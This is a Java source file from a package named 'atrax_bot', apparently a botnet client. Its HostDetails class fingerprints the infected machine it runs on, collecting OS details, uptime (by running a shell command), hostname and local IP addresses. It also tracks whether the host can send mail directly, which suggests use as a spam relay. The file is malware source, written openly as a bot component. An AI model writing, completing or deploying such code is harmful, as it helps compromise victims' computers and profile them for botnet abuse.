
package atrax_bot;

import java.net.InetAddress;
import java.net.UnknownHostException;
/**
 *
 * sends host details
 * 
 */
public class HostDetails {
    /************************
     * TARGET SYSTEM PARAMETERS
     ************************/
    // the name of the operating system
    String osName;
    // the system architecture
    String osArch;
    // version of the operating system
    String osVersion;
    // host uptime
    String hostUpTime;
    // name of the host
    String hostName;
    // IP of this host, defined in the interfaces
    String hostIps;
    
    // SMPTP mode of operation
    // the host can send mail directly:
    //          mode "sef"
    // the host needs it's own SMTP server to send mail:
    //          mode "isp"
    //the host cannot send any mail out
    //          mode "filtered"
    String smtpMode;
    
    public HostDetails(){
        // clear the variables
        osName = null;
        osArch = null;
        osVersion = null;
        hostUpTime = null;
        hostName = null;
        hostIps = "";
        
        /*****************************
         * GET THE DETAILS ABOUT HOST
         *****************************/
        osName = System.getProperty("os.name");
        osArch = System.getProperty("os.arch");
        osVersion = System.getProperty("os.version");
        if (osName.toUpperCase().equals("LINUX")){
            hostUpTime = Tools.runCmd("uptime");
        }
        InetAddress addrs[] = null;
        
        try {
            hostName = InetAddress.getLocalHost().getHostName();
        } catch(UnknownHostException e) {
            e.printStackTrace();
        }
        
        try {
            addrs = InetAddress.getAllByName(hostName);
        } catch(UnknownHostException e) {
            e.printStackTrace();
        }
        
        for (InetAddress addr : addrs){
            if (! addr.isLoopbackAddress() && addr.isSiteLocalAddress()){
                hostIps += addr.getHostAddress() + "||";
            }
        }
    }
}
